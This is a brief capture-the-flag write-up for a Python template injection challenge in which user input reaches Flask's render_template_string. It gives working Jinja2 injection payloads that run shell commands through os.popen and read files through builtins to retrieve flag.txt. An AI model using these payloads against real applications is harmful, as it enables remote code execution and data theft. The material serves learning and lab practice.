# Temoke of the Python

This is a simple Python template injection challenge. The goal is to read the content of the file `flag.txt`.

The user input is passed to `render_template_string` function directly, which is vulnerable to template injection. We can use this vulnerability to achieve remote code execution and read the content of the file `flag.txt` with the following payload:

```text
{{ cycler.__init__.__globals__.os.popen('cat ./flag.txt').read() }}
```

Some alternatives are:

- `{{ get_flashed_messages.__globals__.__builtins__.open("./flag.txt").read() }}`
